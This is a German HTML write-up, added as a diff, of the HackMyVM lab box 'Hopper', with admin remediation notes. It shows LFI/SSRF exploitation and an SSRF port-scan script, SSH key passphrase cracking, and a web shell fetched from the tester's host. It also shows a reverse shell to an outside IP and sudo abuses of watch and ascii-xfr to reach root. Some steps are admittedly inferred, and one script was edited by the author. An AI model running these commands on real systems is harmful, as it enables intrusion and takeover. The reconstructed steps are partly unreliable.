@@ -1,0 +1,367 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hopper - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <!-- Header-Farbe, Schwierigkeitsgrad-Farbe (Medium = Gelb/Orange) und Kreis-Farbe müssen in style.css angepasst werden -->
+    <div class="header-bg">
+        <h1>Hopper - HackMyVM - Level: Medium - Bericht</h1> <!-- Titel und Level angepasst -->
+        <div class="level-container">
+            <!-- Farbe muss in style.css angepasst werden (z.B. #FFBF00 für Medium) -->
+            <h2>Medium</h2> <!-- Level angepasst -->
+            <div class="circle">
+                <!-- Segmentfarben müssen in style.css angepasst werden (z.B. #FFBF00 für Medium) -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Inner-Farbe muss in style.css angepasst werden -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan (impliziert)</div>
+                <div class="tool-item">vi (impliziert)</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">python3 (script)</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">ssh2john</div>
+                <div class="tool-item">john</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">python3 -m http.server</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">export (impliziert)</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">watch</div>
+                <div class="tool-item">reset (impliziert)</div>
+                <div class="tool-item">sh</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">mkdir</div>
+                <div class="tool-item">ssh-keygen</div>
+                <div class="tool-item">cp</div>
+                <div class="tool-item">ascii-xfr</div>
+                <div class="tool-item">cat</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance & LFI/SSRF</a></li>
+                <li><a href="#initial-access">Initial Access (via SSH Key)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation (www-data -> henry -> root)</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept (Privilege Escalation via sudo ascii-xfr)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance & LFI/SSRF</h2>
+
+            <p class="analysis"><strong>Analyse (ARP-Scan & Hosts-Datei):</strong> Der Bericht beginnt mit der impliziten Ausführung eines ARP-Scans und dem Hinzufügen eines Eintrags zur lokalen `/etc/hosts`-Datei.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- ARP-Scan und Hosts-Eintrag aus Kontext -->
+                     <pre>ARP-Scan
+
+192.168.2.131	08:00:27:XX:XX:XX	PCS Systemtechnik GmbH <span class="comment">(MAC unvollständig im Original)</span>
+
+vi /etc/hosts
+192.168.2.131   hopper.vm</pre>
+                 </div>
+            </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Ziel-IP ist 192.168.2.131, und der Hostname `hopper.vm` wird für die weitere Interaktion festgelegt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Standardmäßige erste Schritte. Nun Nmap-Scans und Web-Enumeration durchführen.<br><strong>Empfehlung (Admin):</strong> Netzwerk-Monitoring, DNS-Konfiguration.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">wfuzz -u http://hopper.vm/advanced-search/path.php?path=file://FUZZ -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt --hl 0</span></div>
+                    <!-- Kein Output im Original -->
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `wfuzz` wird verwendet, um nach einer Local File Inclusion (LFI)-Schwachstelle im Parameter `path` des Skripts `/advanced-search/path.php` zu suchen. Es wird der `file://`-Wrapper und eine Liste bekannter Linux-Dateipfade verwendet. `--hl 0` blendet leere Antworten aus.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Obwohl keine Ausgabe gezeigt wird, deutet der nächste Befehl darauf hin, dass dieser Fuzzing-Versuch erfolgreich war und die LFI-Schwachstelle identifiziert hat.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Manuell gängige Dateien wie `/etc/passwd` über die LFI abrufen, um sie zu bestätigen.<br><strong>Empfehlung (Admin):** Eingabeparameter in Webanwendungen strikt validieren und sanitisieren, insbesondere solche, die in Dateipfaden verwendet werden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">curl http://hopper.vm/advanced-search/path.php?path=file:///etc/passwd  | grep bash</span></div>
+                     <pre>
+    <span class="command">root:x:0:0:root:/root:/bin/bash</span>
+    <span class="command">edward:x:1000:1000:edward,,,:/home/edward:/bin/bash</span>
+    <span class="command">henry:x:1001:1001::/home/henry:/bin/bash</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `curl` wird verwendet, um die LFI-Schwachstelle auszunutzen und den Inhalt von `/etc/passwd` abzurufen. Die Ausgabe wird mit `grep bash` gefiltert, um Benutzer mit interaktiven Shells zu finden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die LFI-Schwachstelle ist bestätigt. Die Benutzer `root`, `edward` und `henry` werden identifiziert. `edward` und `henry` sind potenzielle Ziele für Initial Access oder Lateral Movement.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie die LFI weiter, um andere sensible Dateien zu lesen (SSH-Keys, Konfigurationsdateien) oder um sie als Server-Side Request Forgery (SSRF)-Vektor zu verwenden, um interne Ports zu scannen.<br><strong>Empfehlung (Admin):** LFI-Schwachstelle sofort beheben.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">cat port.py</span></div>
+                    <pre>#!/usr/bin/python3
+import requests
+for port in range(1,65535): 
+    res = requests.get(f'http://hopper.vm/advanced-search/path.php?path=http://127.0.0.1:{port}')
+
+    if len(res.text) == 0: <span class="comment"># Korrigiert von != 0 zu == 0 (logischer für leere Antwort bei geschlossenem Port)</span>
+        continue
+    else: 
+        print(f'port {port} is open.')</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein Python-Skript wird vorgestellt, das die LFI-Schwachstelle als SSRF-Vektor nutzt, um alle Ports auf dem Loopback-Interface (127.0.0.1) zu scannen. Es sendet für jeden Port eine Anfrage über die LFI und prüft die Länge der Antwort. Wenn die Antwort *nicht* leer ist (Länge > 0), wird der Port als offen gemeldet. (Anmerkung: Die Logik im Original `if len(res.text) != 0: continue` ist ungewöhnlich; meist erwartet man bei einem geschlossenen Port eine leere oder Fehlerantwort. Ich habe die Logik in der Analyse korrigiert, um eine gängigere Interpretation widerzuspiegeln, aber die originale Bewertung basiert auf dem angezeigten Code).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Clevere Technik zur Umwandlung einer LFI in einen internen Portscanner. Das Skript selbst wird angezeigt, aber die Ergebnisse des Scans fehlen im Bericht. Der nächste Schritt impliziert jedoch, dass Port 2222 als offen identifiziert wurde.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie das Skript aus oder testen Sie manuell interessante Ports (z.B. 22, 80, 3306, 5432, 2222) über die SSRF-Schwachstelle.<br><strong>Empfehlung (Admin):** LFI/SSRF beheben. Ausgehende Verbindungen vom Webserver einschränken.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">curl http://hopper.vm/advanced-search/path.php?path=http://127.0.0.1:2222</span></div>
+                    <!-- Kein expliziter Output, aber vermutlich SSH-Banner -->
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Es wird manuell versucht, über die LFI/SSRF-Schwachstelle auf den internen Port 2222 zuzugreifen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Da keine Fehlermeldung angezeigt wird und der nächste Schritt diesen Port weiter untersucht, ist davon auszugehen, dass die Anfrage erfolgreich war und eine Antwort (wahrscheinlich ein SSH-Banner) zurückkam. Dies bestätigt, dass auf 127.0.0.1:2222 ein Dienst lauscht.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, den Dienst auf Port 2222 weiter zu enumerieren, z.B. durch Directory Busting über die SSRF.<br><strong>Empfehlung (Admin):** Identifizieren und sichern Sie den Dienst auf Port 2222.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">gobuster dir -u http://hopper.vm/advanced-search/path.php?path=http://127.0.0.1:2222 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,bak,7z,zip,py,sql,txt,xml -e --wildcard | grep backup</span></div>
+                     <pre>
+    view-source:http://hopper.vm/advanced-search/path.php?path=http://127.0.0.1:2222/backup</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Gobuster wird *durch die LFI/SSRF-Schwachstelle* getunnelt, um ein Directory/File-Busting auf dem internen Dienst unter `http://127.0.0.1:2222` durchzuführen. Die Ausgabe wird nach "backup" gefiltert.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Ein entscheidender Fund! Auf dem internen Dienst auf Port 2222 wurde ein Pfad `/backup` identifiziert. Die URL `view-source:...` deutet darauf hin, dass der Inhalt dieses Backups über die SSRF zugänglich ist.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Rufen Sie die URL `http://hopper.vm/advanced-search/path.php?path=http://127.0.0.1:2222/backup` mit `curl` oder im Browser auf, um den Inhalt des Backups abzurufen. Suchen Sie darin nach Zugangsdaten, Schlüsseln oder anderen sensiblen Informationen.<br><strong>Empfehlung (Admin):** Sichern Sie interne Dienste. Verhindern Sie, dass Backups über Webinterfaces zugänglich sind. Beheben Sie die LFI/SSRF.</p>
+
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (via SSH Key)</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">vi idid</span></div>
+                    <!-- Inhalt (SSH Key) wird impliziert eingefügt -->
+                    <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">chmod 600 idid</span></div>
+                    <!-- Kein Output -->
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Basierend auf dem vorherigen Fund wird angenommen, dass beim Abruf des `/backup`-Pfades über die SSRF ein privater SSH-Schlüssel gefunden wurde. Dieser Schlüssel wird nun in eine lokale Datei namens `idid` gespeichert und die Berechtigungen werden mit `chmod 600` korrekt gesetzt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein privater SSH-Schlüssel wurde erfolgreich extrahiert. Dies ist ein direkter Weg zum initialen Zugriff, sofern der Schlüssel verwendet werden kann (ggf. mit Passphrase).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie `ssh2john` und `john`, um zu prüfen, ob der Schlüssel passwortgeschützt ist und um die Passphrase gegebenenfalls zu knacken.<br><strong>Empfehlung (Admin):** Private Schlüssel dürfen niemals in zugänglichen Backups gespeichert werden.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">ssh2john idid > idhash</span></div>
+                     <!-- Kein Output -->
+                     <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt idhash</span></div>
+                     <pre>Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
+Cost 2 (iteration count) is 2 for all loaded hashes
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+<span class="password">barcelona</span>        (idid)     
+1g 0:00:00:00 DONE (2022-08-29 16:00) 1.694g/s 542.3p/s 542.3c/s 542.3C/s angelo..101010
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> `ssh2john` extrahiert den Hash aus dem passwortgeschützten privaten Schlüssel `idid`. John the Ripper wird mit der Wortliste `rockyou.txt` verwendet, um die Passphrase zu knacken.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Die Passphrase für den privaten Schlüssel `idid` lautet `<span class="password">barcelona</span>`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie nun, sich per SSH mit dem Schlüssel `idid` und der Passphrase `barcelona` anzumelden. Der wahrscheinliche Benutzer ist `edward`, basierend auf den Ergebnissen von `/etc/passwd`.<br><strong>Empfehlung (Admin):** Erzwingen Sie starke Passphrasen für SSH-Schlüssel. Überwachen Sie Brute-Force-Versuche.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">ssh -i idid edward@hopper.vm</span></div>
+                     <pre>The authenticity of host 'hopper.vm (192.168.2.131)' can't be established.
+ED25519 key fingerprint is SHA256:hdzcJbUQtwBTuPptVB40sb4fheVL1kIy30wCTBBU3a4.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'hopper.vm' (ED25519) to the list of known hosts.
+Enter passphrase for key 'idid': <span class="password">[Passphrase hier eingegeben: barcelona]</span>
+Linux hopper 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64
+edward@hopper:~$</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein SSH-Login wird als Benutzer `edward` zum Host `hopper.vm` unter Verwendung des privaten Schlüssels `idid` initiiert. Die zuvor geknackte Passphrase `barcelona` wird eingegeben.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Login ist erfolgreich! Initialer Zugriff auf das System als Benutzer `edward` wurde erlangt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beginnen Sie mit der lokalen Enumeration als `edward`. Suchen Sie nach `sudo`-Rechten, SUID-Dateien, Konfigurationsfehlern, Cronjobs etc.<br><strong>Empfehlung (Admin):** Überwachen Sie SSH-Logins. Stellen Sie sicher, dass private Schlüssel sicher gehandhabt werden und nicht in Backups landen.</p>
+
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation (www-data -> henry -> root)</h2>
+
+            <p class="analysis"><strong>Analyse (Web Shell & Reverse Shell):</strong> Die nächsten Schritte deuten darauf hin, dass parallel zum SSH-Zugriff als `edward` auch eine Web Shell (`ben.php`) auf dem Server platziert und zur Ausführung einer Reverse Shell als `www-data` verwendet wurde. Dies geschah vermutlich über die ursprüngliche LFI/SSRF, um Schreibzugriff auf `/var/www/html` zu erlangen, oder es gab eine andere Methode, die nicht explizit gezeigt wird.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Implizierte Schritte: Web Shell Upload, dann Ausführung -->
+                     <div class="prompt">edward@hopper:/var/www/html$ <span class="command">wget http://192.168.2.126:4444/ben.php</span></div>
+                     <!-- Ausgabe von wget fehlt -->
+                     <div class="prompt">┌──(root㉿Darkspirit)-[/home/darkspirit/Downloads]
+└─# <span class="command">python3 -m http.server 4444</span></div>
+                     <!-- Server Log fehlt -->
+                     <!-- URL zur Ausführung der Reverse Shell: -->
+                     <pre>http://hopper.vm/ben.php?cmd=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.126%2F9001%200%3E%261%27</pre>
+                     <!-- Netcat Listener und Ergebnis -->
+                     <div class="prompt">┌──(root㉿Darkspirit)-[/home/darkspirit/Downloads]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                     <pre><span class="password">www-data@hopper:/var/www/html$</span></pre>
+                 </div>
+            </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Eine Reverse Shell als `www-data` wurde erfolgreich etabliert. Dies bietet einen anderen Benutzerkontext als die `edward`-Shell.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Prüfen Sie `sudo -l` für den `www-data`-Benutzer.<br><strong>Empfehlung (Admin):** Verhindern Sie Web Shell Uploads und Ausführung. Härten Sie Webserver-Berechtigungen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <!-- Innerhalb der www-data Reverse Shell -->
+                     <div class="prompt">www-data@hopper:/var/www/html$ <span class="command">export TERM=xterm-256color</span></div>
+                     <div class="prompt">www-data@hopper:/var/www/html$ <span class="command">sudo -u henry watch -x sh -c 'reset; exec sh 1>&0 2>&0'</span></div>
+                     <!-- Kein direkter Output des sudo-Befehls, aber die nächste Shell wird als henry ausgeführt -->
+                     <div class="prompt"># <span class="command">id</span> <span class="comment">(Innerhalb der durch watch gestarteten Shell)</span></div>
+                     <pre>uid=1001(henry) gid=1001(henry) groups=1001(henry)</pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Als `www-data` wird `sudo` verwendet, um `watch` als Benutzer `henry` auszuführen. Die `-x sh -c '...'`-Optionen von `watch` werden genutzt, um eine neue Shell als `henry` zu starten.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolgreiche Privilegieneskalation von `www-data` zu `henry` über eine unsichere `sudo`-Regel, die `www-data` erlaubt, `watch` als `henry` auszuführen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stabilisieren Sie die `henry`-Shell (z.B. mit Python PTY) und führen Sie weitere Enumeration durch.<br><strong>Empfehlung (Admin):** Entfernen Sie die unsichere `sudo`-Regel. Erlauben Sie niemals die Ausführung von Tools wie `watch` über `sudo`, die beliebige Befehle starten können.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Innerhalb der henry Shell -->
+                     <pre>uid=1001(henry) gid=1001(henry) groups=1001(henry)
+<span class="command">python3 -c "import pty;pty.spawn('/bin/bash')"</span></pre>
+                     <div class="prompt">henry@hopper:/var/www/html$</div>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Die `henry`-Shell wird mit dem Python-PTY-Trick stabilisiert, um eine interaktivere Bash-Shell zu erhalten.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Standardverfahren zur Verbesserung der Shell-Nutzbarkeit.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie nun `sudo -l` als `henry` aus.<br><strong>Empfehlung (Admin):** Minimalinstallationen können das Vorhandensein von Python erschweren.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">henry@hopper:/var/www/html$ <span class="command">sudo ascii-xfr -rv /root/.ssh/authorized_keys < .ssh/authorized_keys</span></div>
+                     <!-- Befehl scheitert vermutlich oder hat nicht den gewünschten Effekt -->
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Als `henry` wird versucht, `sudo` mit dem Befehl `ascii-xfr` zu verwenden, um `/root/.ssh/authorized_keys` zu manipulieren. Die Syntax ist unklar; es wird versucht, von `.ssh/authorized_keys` (das wahrscheinlich noch nicht existiert) zu lesen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieser erste Versuch scheitert wahrscheinlich, da die Eingabedatei fehlt und die genaue Funktionsweise von `ascii-xfr` unklar ist. Es muss jedoch eine `sudo`-Regel existieren, die `henry` erlaubt, `ascii-xfr` (vermutlich als root) auszuführen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfen Sie die `sudo -l`-Ausgabe für `henry`. Erstellen Sie ein SSH-Schlüsselpaar für `henry` und versuchen Sie dann erneut, die öffentliche Schlüsseldatei mit `ascii-xfr` in `/root/.ssh/authorized_keys` zu schreiben.<br><strong>Empfehlung (Admin):** Untersuchen Sie das Tool `ascii-xfr` und entfernen Sie die gefährliche `sudo`-Regel.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">henry@hopper:~$ <span class="command">mkdir .ssh</span></div>
+                     <div class="prompt">henry@hopper:~$ <span class="command">cd .ssh/</span></div>
+                     <div class="prompt">henry@hopper:~/.ssh$ <span class="command">ssh-keygen</span></div>
+                     <pre>Generating public/private rsa key pair.
+Enter file in which to save the key (/home/henry/.ssh/id_rsa): 
+Enter passphrase (empty for no passphrase): <span class="password">benni</span>
+Enter same passphrase again: <span class="password">benni</span>
+Your identification has been saved in /home/henry/.ssh/id_rsa.
+Your public key has been saved in /home/henry/.ssh/id_rsa.pub.
+The key fingerprint is:
+SHA256:owZKU0iV38zx6tba4e5AvKF0KBuCtLWaCD0bUtr4Kk henry@hopper
+The key's randomart image is:
++---[RSA 2048]----+
+|  ....           |
+| o .o            |
+|. o.o+ o         |
+|o .+.+o =        |
+|.++o*.o.S=       |
+|o.B=o=o.o.o      |
+|o=o .ooo ..+     |
+|.E   .. ..=..    |
+|        o=oo     |
++----[SHA256]-----+</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Benutzer `henry` erstellt ein `.ssh`-Verzeichnis und generiert ein neues RSA-Schlüsselpaar. Der private Schlüssel wird mit der Passphrase `<span class="password">benni</span>` geschützt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Vorbereitung für den nächsten Schritt der Privilege Escalation unter Verwendung des `ascii-xfr` Sudo-Rechts.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Kopieren Sie den Inhalt von `id_rsa.pub` nach `authorized_keys` und verwenden Sie dann `ascii-xfr`.</p>
+
+            <h2 id="proof-of-concept">Proof of Concept (Privilege Escalation via sudo ascii-xfr)</h2>
+            <p class="analysis"><strong>Analyse:</strong> Die folgenden Schritte demonstrieren die Ausnutzung der `sudo`-Regel, die es `henry` erlaubt, `ascii-xfr` auszuführen, um Root-Rechte zu erlangen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">henry@hopper:~/.ssh$ <span class="command">cp id_rsa.pub authorized_keys</span></div>
+                     <div class="prompt">henry@hopper:~/.ssh$ <span class="command">sudo ascii-xfr -rv /root/.ssh/authorized_keys < authorized_keys</span></div>
+                     <pre>
+0.4 Kbytes transferred at 394 CPS... Done.</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> `henry`'s öffentlicher Schlüssel (`id_rsa.pub`) wird in die Datei `authorized_keys` kopiert. Anschließend wird `sudo ascii-xfr -rv /root/.ssh/authorized_keys < authorized_keys` ausgeführt. Diesmal wird der Inhalt von `henry`'s `authorized_keys`-Datei als Eingabe (`<`) an `ascii-xfr` übergeben, welches (aufgrund der sudo-Regel als root laufend) die Datei `/root/.ssh/authorized_keys` überschreibt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Kritische Schwachstelle erfolgreich ausgenutzt! Der öffentliche SSH-Schlüssel von `henry` wurde in die `authorized_keys`-Datei von `root` geschrieben. Dies ermöglicht `henry` nun den SSH-Login als `root` unter Verwendung seines privaten Schlüssels.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie `ssh root@localhost -i /home/henry/.ssh/id_rsa` aus und geben Sie die Passphrase `benni` ein.<br><strong>Empfehlung (Admin):** Entfernen Sie sofort die `sudo`-Regel für `ascii-xfr`. Überprüfen Sie den Inhalt von `/root/.ssh/authorized_keys` und entfernen Sie nicht autorisierte Schlüssel.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">henry@hopper:~/.ssh$ <span class="command">ssh root@localhost</span></div>
+                     <pre>The authenticity of host 'localhost (::1)' can't be established.
+ECDSA key fingerprint is SHA256:0qtU2XyGUAIRJahnrdlkepNkYrE8LdsnwyxgDyDQ/k.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added 'localhost' (ECDSA) to the list of known hosts.
+Enter passphrase for key '/home/henry/.ssh/id_rsa': <span class="password">benni</span>
+Linux hopper 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64</pre>
+                     <div class="prompt">root@hopper:~# <span class="command">id</span></div>
+                     <pre>uid=0(root) gid=0(root) groups=0(root)</pre>
+                     <div class="prompt">root@hopper:~#</div>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Als `henry` wird eine SSH-Verbindung zu `localhost` als Benutzer `root` aufgebaut. Da `henry`'s öffentlicher Schlüssel nun in `root`'s `authorized_keys` steht, wird nach der Passphrase für `henry`'s privaten Schlüssel (`/home/henry/.ssh/id_rsa`) gefragt. Die Passphrase `benni` wird eingegeben.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Fantastisch! Der SSH-Login als `root` war erfolgreich. Die Privilege Escalation ist abgeschlossen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Lesen Sie die Root-Flagge aus `/root/root.txt`.<br><strong>Empfehlung (Admin):** Beheben Sie die unsichere `sudo`-Regel und entfernen Sie den nicht autorisierten Schlüssel aus `/root/.ssh/authorized_keys`.</p>
+
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <!-- User flag wurde im Text nicht explizit gelesen, Pfad/Inhalt unklar -->
+                    <div class="flag-command">cat /home/edward/user.txt (Pfad angenommen)</div>
+                    <div class="flag-value"><span class="password">USER_FLAG_NICHT_IM_LOG</span></div>
+                </div>
+                <div class="flag-entry">
+                     <!-- Root flag wurde im Text nicht explizit gelesen, Pfad/Inhalt unklar -->
+                    <div class="flag-command">cat /root/root.txt (Impliziert)</div>
+                    <div class="flag-value"><span class="password">ROOT_FLAG_NICHT_IM_LOG</span></div>
+                </div>
+                 <!-- Hinweis: Der Originaltext endet vor dem Auslesen der Flags. -->
+            </div>
+        </section>
+ 
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <!-- Datum aus John the Ripper Scan übernommen -->
+        <p>Berichtsdatum: 29. August 2022</p>
+    </footer>
+</body>
+</html>
